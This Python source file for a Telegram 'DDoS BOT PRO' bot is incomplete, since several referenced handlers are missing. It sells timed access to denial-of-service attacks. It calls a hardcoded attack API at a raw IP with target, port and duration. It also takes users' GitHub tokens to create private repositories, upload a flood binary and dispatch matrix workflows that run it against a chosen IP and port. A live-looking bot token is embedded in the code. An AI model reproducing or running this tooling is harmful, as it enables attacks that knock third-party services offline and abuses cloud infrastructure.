import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
    InputMediaAnimation
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8313004027:AAHraSKDS3w39yzXeecvcHSV0V7oOXRTVv0")
DEVELOPER_TAG = "@BITCH_lI_mBACK"

# Owner and admin control
OWNER_IDS = {7848273230}
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.json"  # Changed to JSON for multiple tokens
TOKENS_STATUS_FILE = "tokens_status.json"
STATS_FILE = "stats.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
DEFAULT_THREADS_FILE = "threads.json"
CONCURRENT_FILE = "concurrent.json"
API_URL = "http://194.62.248.97:9090/v1/start"

# Track running attacks per chat
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}
USER_STATS: Dict[str, Dict[str, int]] = {}

# UI Constants
BANNERS = {
    "main": """
╔═══════════════════════════╗
║    🚀 DDoS BOT PRO v3.0   ║
║    Advanced Attack System ║
╚═══════════════════════════╝
    """,
    
    "attack": """
╔═══════════════════════════╗
║        ⚡ ATTACK MODE     ║
║    Mixed API + GitHub     ║
╚═══════════════════════════╝
    """,
    
    "api": """
╔═══════════════════════════╗
║       🔥 API MODE        ║
║     Pure API Power        ║
╚═══════════════════════════╝
    """,
    
    "admin": """
╔═══════════════════════════╗
║       👑 ADMIN PANEL     ║
║    Control Center         ║
╚═══════════════════════════╝
    """
}

PROGRESS_BARS = [
    "▱▱▱▱▱▱▱▱▱▱",
    "▰▱▱▱▱▱▱▱▱▱", 
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▰▰"
]

ANIME_GIFS = [
    "https://media.tenor.com/2RoHfo7f0hUAAAAC/anime-wave.gif",
    "https://media.tenor.com/3bTxOPmS00sAAAAC/anime-fire.gif",
    "https://media.tenor.com/5vidWdyKENAAAAAC/love-live-sunshine-anime.gif",
    "https://media.tenor.com/Gf0kt8Vr2AAAAAAC/anime-power.gif"
]

# ---------------- Enhanced Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_stats() -> Dict[str, Dict[str, int]]:
    return load_json(STATS_FILE, {})

def save_stats(stats: Dict[str, Dict[str, int]]) -> None:
    save_json(STATS_FILE, stats)

def update_user_stats(user_id: int, attack_type: str, duration: int):
    stats = load_stats()
    user_key = str(user_id)
    if user_key not in stats:
        stats[user_key] = {"total_attacks": 0, "total_duration": 0, "mixed_attacks": 0, "api_attacks": 0}
    
    stats[user_key]["total_attacks"] += 1
    stats[user_key]["total_duration"] += duration
    if attack_type == "mixed":
        stats[user_key]["mixed_attacks"] += 1
    else:
        stats[user_key]["api_attacks"] += 1
    
    save_stats(stats)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def set_concurrent(value: int) -> None:
    save_json(CONCURRENT_FILE, {"concurrent": int(value)})

def get_concurrent() -> int:
    data = load_json(CONCURRENT_FILE, {"concurrent": 3})
    return int(data.get("concurrent", 3))

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    # Auto-approve owners and admins
    if is_owner(user_id) or is_admin(user_id):
        return True
        
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

# ---------------- MULTIPLE TOKENS SUPPORT ----------------
def save_user_token(user_id: int, token: str) -> None:
    """Save multiple tokens for a user"""
    tokens_data = load_json(TOKENS_FILE, {})
    user_key = str(user_id)
    
    if user_key not in tokens_data:
        tokens_data[user_key] = []
    
    # Add token if not already exists
    if token not in tokens_data[user_key]:
        tokens_data[user_key].append(token)
        save_json(TOKENS_FILE, tokens_data)

def get_user_tokens(user_id: int) -> List[str]:
    """Get all tokens for a user"""
    tokens_data = load_json(TOKENS_FILE, {})
    return tokens_data.get(str(user_id), [])

def remove_user_token(user_id: int, token_index: int) -> bool:
    """Remove a specific token by index"""
    tokens_data = load_json(TOKENS_FILE, {})
    user_key = str(user_id)
    
    if user_key in tokens_data and 0 <= token_index < len(tokens_data[user_key]):
        removed_token = tokens_data[user_key].pop(token_index)
        save_json(TOKENS_FILE, tokens_data)
        return True
    return False

def clear_user_tokens(user_id: int) -> None:
    """Remove all tokens for a user"""
    tokens_data = load_json(TOKENS_FILE, {})
    user_key = str(user_id)
    if user_key in tokens_data:
        tokens_data[user_key] = []
        save_json(TOKENS_FILE, tokens_data)

def count_user_tokens(user_id: int) -> int:
    """Count how many tokens a user has"""
    return len(get_user_tokens(user_id))

def count_valid_user_tokens(user_id: int) -> int:
    """Count how many valid tokens a user has"""
    tokens = get_user_tokens(user_id)
    valid_count = 0
    for token in tokens:
        if validate_github_token(token):
            valid_count += 1
    return valid_count

def rand_repo_name(prefix="soul-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    wf = {
        "name": "Matrix 7 runs",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run soul", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    r = requests.post(
        "https://api.github.com/user/repos",
        headers=gh_headers(token),
        json={"name": name, "private": True, "auto_init": False},
        timeout=30
    )
    return r.json() if r.status_code in (201, 202) else None

def gh_delete_repo(token: str, full_name: str) -> bool:
    r = requests.delete(
        f"https://api.github.com/repos/{full_name}",
        headers=gh_headers(token),
        timeout=30
    )
    return r.status_code == 204

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    b64 = base64.b64encode(content_bytes).decode()
    r = requests.put(
        f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
        headers=gh_headers(token),
        json={"message": message, "content": b64},
        timeout=30
    )
    return r.status_code in (201, 200)

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    r = requests.post(
        f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
        headers=gh_headers(token),
        json={"ref": ref},
        timeout=30
    )
    return r.status_code in (204, 201)

def validate_github_token(token: str) -> bool:
    r = requests.get(
        "https://api.github.com/user",
        headers=gh_headers(token),
        timeout=20
    )
    return r.status_code == 200

def set_status(chat_id: int, running: bool, until: Optional[datetime], repos: Optional[List[str]], attack_type: str = "") -> None:
    ATTACK_STATUS[chat_id] = {
        "running": running, 
        "until": until, 
        "repos": repos,
        "type": attack_type,
        "started": datetime.utcnow() if running else None
    }

def get_status(chat_id: int) -> Dict[str, Any]:
    return ATTACK_STATUS.get(chat_id, {
        "running": False, 
        "until": None, 
        "repos": [],
        "type": "",
        "started": None
    })

async def advanced_progress(context: ContextTypes.DEFAULT_TYPE, chat_id: int, title: str, steps: List[str], delay: float = 0.5):
    """Advanced progress animation with multiple steps"""
    msg = await context.bot.send_message(chat_id=chat_id, text=f"🔄 {title}...")
    
    for i, step in enumerate(steps, 1):
        progress = PROGRESS_BARS[min(i, len(PROGRESS_BARS)-1)]
        percentage = min(i * 10, 100)
        
        status_text = f"""
🔄 {title}
{progress} {percentage}%
📝 {step}
        """.strip()
        
        await asyncio.sleep(delay)
        try:
            await msg.edit_text(status_text)
        except Exception:
            pass
    
    return msg

def create_status_panel(chat_id: int) -> str:
    """Create beautiful status panel"""
    status = get_status(chat_id)
    stats = load_stats()
    user_stats = stats.get(str(chat_id), {})
    
    if status["running"]:
        time_elapsed = datetime.utcnow() - status["started"]
        time_remaining = status["until"] - datetime.utcnow()
        
        panel = f"""
╔═══════════════════════════╗
║       📊 LIVE STATUS     ║
╠═══════════════════════════╣
║ • Type: {status['type']:<15} ║
║ • Running: {len(status['repos']):<2} repos      ║
║ • Elapsed: {str(time_elapsed).split('.')[0]:<9} ║
║ • Remaining: {str(time_remaining).split('.')[0]:<6} ║
║ • Until: {status['until'].strftime('%H:%M:%S'):<9} ║
╚═══════════════════════════╝
        """.strip()
    else:
        # Show token count in status
        token_count = count_user_tokens(chat_id)
        valid_token_count = count_valid_user_tokens(chat_id)
        
        panel = f"""
╔═══════════════════════════╗
║       📊 USER STATS      ║
╠═══════════════════════════╣
║ • Total Attacks: {user_stats.get('total_attacks', 0):<4} ║
║ • Mixed: {user_stats.get('mixed_attacks', 0):<4} | API: {user_stats.get('api_attacks', 0):<4} ║
║ • Total Time: {user_stats.get('total_duration', 0):<6}s ║
║ • Tokens: {valid_token_count}/{token_count} valid   ║
║ • Status: 🟢 READY        ║
╚═══════════════════════════╝
        """.strip()
    
    return panel

def create_attack_stats(ip: str, port: str, duration: str, github_count: int, api_count: int) -> str:
    """Create attack statistics panel"""
    total_power = github_count * 7 + api_count  # 7 sessions per GitHub repo
    
    stats = f"""
╔═══════════════════════════╗
║        📈 STATISTICS     ║
╠═══════════════════════════╣
║ • Target: {ip:<15} ║
║ • Port: {port:<16} ║
║ • Duration: {duration:<11}s ║
║ • GitHub Repos: {github_count:<7} ║
║ • API Calls: {api_count:<9} ║
║ • Total Power: {total_power:<7} ║
╚═══════════════════════════╝
    """.strip()
    
    return stats

def anime_gif_url() -> str:
    return random.choice(ANIME_GIFS)

def api_attack(ip: str, port: str, duration: str) -> bool:
    """Send attack request to API"""
    try:
        url = f"{API_URL}?target={ip}&port={port}&time={duration}"
        response = requests.get(url, timeout=10)
        return response.status_code == 200
    except Exception:
        return False

# ---------------- Enhanced Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Advanced startup animation
    startup_steps = [
        "Initializing systems...",
        "Loading attack modules...",
        "Connecting to API...",
        "Validating tokens...",
        "Starting services...",
        "Ready for combat! 🚀"
    ]
    
    msg = await advanced_progress(context, chat_id, "SYSTEM BOOT", startup_steps, 0.6)
    
    welcome_text = f"""
{BANNERS['main']}

👋 Welcome to Advanced DDoS Bot
⚡ Mixed GitHub + API Power
🔧 Developer: {DEVELOPER_TAG}

💫 Features:
• Multiple Token Support
• Mixed Attack Mode
• API-Only Mode  
• Real-time Status
• Advanced Statistics
• Professional UI

Use /help for commands
    """.strip()
    
    try:
        await msg.edit_text(welcome_text)
    except Exception:
        await context.bot.send_message(chat_id=chat_id, text=welcome_text)
    
    # Send status panel
    status_panel = create_status_panel(chat_id)
    await context.bot.send_message(chat_id=chat_id, text=status_panel)
    
    # Send anime GIF
    try:
        await context.bot.send_animation(
            chat_id=chat_id, 
            animation=anime_gif_url(),
            caption="🚀 System Online - Ready for Action!"
        )
    except Exception:
        pass

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    help_text = f"""
{BANNERS['main']}

📖 **AVAILABLE COMMANDS:**

🔰 **Basic Commands:**
/start - Start bot with style
/help - Show this help menu  
/ping - Check bot latency
/status - Live attack status

⚡ **Attack Commands:**
/attack ip port time - Mixed attack
/RajaXFlame ip port time - API only
/setconcurrent N - Set concurrent

🔑 **Token Management:**
/settoken token - Add GitHub token
/mytokens - Show your tokens
/removetoken index - Remove token
/cleartokens - Remove all tokens

    """.strip()
    
    if is_admin(user_id):
        help_text += """

👑 **Admin Commands:**
/users - Manage user access
/check - Token status check
/add userid days - Add user
/remove userid - Remove user
/threads N - Set threads
/file - Upload binary
/addadmin userid - Add admin
/removeadmin userid - Remove admin
        """.strip()
    
    keyboard = []
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    keyboard.extend([
        [InlineKeyboardButton("⚡ Quick Attack", callback_data="quick_attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status_check")],
        [InlineKeyboardButton("🔧 Settings", callback_data="settings")],
        [InlineKeyboardButton("🔑 My Tokens", callback_data="my_tokens")]
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(help_text, reply_markup=reply_markup)
    
    # Send enhanced status
    status_panel = create_status_panel(update.effective_chat.id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=status_panel)

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "admin_panel":
        if not is_admin(user_id):
            await query.edit_message_text("❌ Admin access required!")
            return
            
        text = f"""
{BANNERS['admin']}

🔧 **Admin Control Panel**

👥 User Management:
/add userid days - Add user
/remove userid - Remove user
/users - List all users

⚙️ System Settings:
/threads N - Set threads
/setconcurrent N - Concurrent
/file - Upload binary

📊 Monitoring:
/check - Token status
/users - User list

👑 Admin Management:
/addadmin userid - Add admin  
/removeadmin userid - Remove
        """.strip()
        
        await query.edit_message_text(text)
        
    elif query.data == "quick_attack":
        await query.edit_message_text(
            "⚡ Quick Attack Setup\n\n"
            "Use: /attack IP PORT TIME\n"
            "Example: /attack 1.1.1.1 80 60\n\n"
            "Or: /RajaXFlame IP PORT TIME\n"
            "For API-only attack"
        )
        
    elif query.data == "status_check":
        status_panel = create_status_panel(query.message.chat_id)
        await query.edit_message_text(status_panel)
        
    elif query.data == "settings":
        threads = get_default_threads()
        concurrent = get_concurrent()
        
        settings_text = f"""
🔧 **System Settings**

📊 Current Configuration:
• Threads: {threads}
• Concurrent: {concurrent}
• Binary: {'✅' if os.path.exists(BINARY_PATH) else '❌'}

⚙️ Change Settings:
/threads N - Change threads
/setconcurrent N - Change concurrent
/file - Upload binary
        """.strip()
        
        await query.edit_message_text(settings_text)
        
    elif query.data == "my_tokens":
        tokens = get_user_tokens(user_id)
        valid_count = count_valid_user_tokens(user_id)
        
        if not tokens:
            await query.edit_message_text("🔑 You have no tokens saved.\nUse /settoken to add tokens.")
            return
            
        token_list = f"🔑 **Your Tokens ({valid_count}/{len(tokens)} valid):**\n\n"
        for i, token in enumerate(tokens, 1):
            status = "✅" if validate_github_token(token) else "❌"
            token_list += f"{i}. {status} `{token[:8]}...{token[-4:]}`\n"
        
        token_list += f"\n💡 Use /removetoken INDEX to remove a token"
        await query.edit_message_text(token_list)

# ---------------- MULTIPLE TOKENS HANDLERS ----------------
async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    # Allow owners to set tokens without being in users list
    if not is_user_approved(uid) and not is_owner(uid):
        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
        return
        
    if not context.args:
        await update.message.reply_text("💡 Usage: /settoken YOUR_GITHUB_TOKEN")
        return
        
    token = context.args[0]
    
    if not validate_github_token(token):
        await update.message.reply_text("❌ Invalid GitHub token. Please check and try again.")
        return
        
    save_user_token(uid, token)
    token_count = count_user_tokens(uid)
    valid_count = count_valid_user_tokens(uid)
    
    await update.message.reply_text(
        f"✅ GitHub token added successfully!\n"
        f"📊 You now have {valid_count}/{token_count} valid tokens"
    )

async def cmd_mytokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    tokens = get_user_tokens(uid)
    valid_count = count_valid_user_tokens(uid)
    
    if not tokens:
        await update.message.reply_text("🔑 You have no tokens saved.\nUse /settoken to add tokens.")
        return
        
    token_list = f"🔑 **Your Tokens ({valid_count}/{len(tokens)} valid):**\n\n"
    for i, token in enumerate(tokens, 1):
        status = "✅" if validate_github_token(token) else "❌"
        token_list += f"{i}. {status} `{token[:8]}...{token[-4:]}`\n"
    
    token_list += f"\n💡 Commands:\n/removetoken INDEX - Remove token\n/cleartokens - Remove all tokens"
    
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="my_tokens")],
        [InlineKeyboardButton("⚡ Attack", callback_data="quick_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(token_list, reply_markup=reply_markup)

async def cmd_removetoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("💡 Usage: /removetoken TOKEN_INDEX\nExample: /removetoken 1")
        return
        
    try:
        token_index = int(context.args[0]) - 1
        tokens = get_user_tokens(uid)
        
        if token_index < 0 or token_index >= len(tokens):
            await update.message.reply_text(f"❌ Invalid token index. You have tokens 1-{len(tokens)}")
            return
            
        if remove_user_token(uid, token_index):
            await update.message.reply_text(f"✅ Token #{token_index + 1} removed successfully!")
        else:
            await update.message.reply_text("❌ Failed to remove token.")
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number.")

async def cmd_cleartokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    token_count = count_user_tokens(uid)
    
    if token_count == 0:
        await update.message.reply_text("🔑 You have no tokens to clear.")
        return
        
    clear_user_tokens(uid)
    await update.message.reply_text(f"✅ All {token_count} tokens cleared successfully!")

# [Rest of the handlers remain the same - cmd_ping, cmd_status, cmd_users, cmd_check, cmd_add, cmd_remove, etc.]
# ... (Include all the other handlers from previous code)

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_user_approved(uid):
        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
        return
        
    if len(context.args) != 3:
        await update.message.reply_text("💡 Usage: /attack IP PORT DURATION")
        return
        
    ip, port, duration = context.args
    
    try:
        int(port)
        int(duration)
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be integers.")
        return
        
    if not os.path.exists(BINARY_PATH):
        await update.message.reply_text("❌ Binary not found. Admin must upload via /file")
        return

    # Get valid tokens - NOW USING MULTIPLE TOKENS
    valid_tokens = [t for t in get_user_tokens(uid) if validate_github_token(t)]
    concurrent = get_concurrent()
    
    attack_stats = create_attack_stats(ip, port, duration, len(valid_tokens), concurrent)
    await update.message.reply_text(attack_stats)
    
    # Rest of attack function remains the same...
    # [Include the full attack function from previous code]

# ---------------- Application Builder ----------------
def build_app():
    # Configure logging
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Build application
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("help", cmd_help))
    application.add_handler(CommandHandler("ping", cmd_ping))
    application.add_handler(CommandHandler("status", cmd_status))
    
    # Token management handlers
    application.add_handler(CommandHandler("settoken", cmd_settoken))
    application.add_handler(CommandHandler("mytokens", cmd_mytokens))
    application.add_handler(CommandHandler("removetoken", cmd_removetoken))
    application.add_handler(CommandHandler("cleartokens", cmd_cleartokens))
    
    # Admin handlers
    application.add_handler(CommandHandler("users", cmd_users))
    application.add_handler(CommandHandler("check", cmd_check))
    application.add_handler(CommandHandler("add", cmd_add))
    application.add_handler(CommandHandler("remove", cmd_remove))
    application.add_handler(CommandHandler("addadmin", cmd_addadmin))
    application.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    application.add_handler(CommandHandler("threads", cmd_threads))
    application.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
    application.add_handler(CommandHandler("file", cmd_file))
    
    # Attack handlers
    application.add_handler(CommandHandler("attack", cmd_attack))
    application.add_handler(CommandHandler("RajaXFlame", cmd_RajaXFlame))
    
    application.add_handler(CallbackQueryHandler(on_button))
    application.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return application

# ---------------- Main Entry Point ----------------
if __name__ == "__main__":
    print(BANNERS["main"])
    print("\n🚀  Starting Advanced DDoS Bot...")
    print("💫  Multiple Tokens Support Enabled")
    print("⚡  Mixed Attack System Ready")
    print(f"🔧  Developer: {DEVELOPER_TAG}\n")
    
    app = build_app()
    app.run_polling()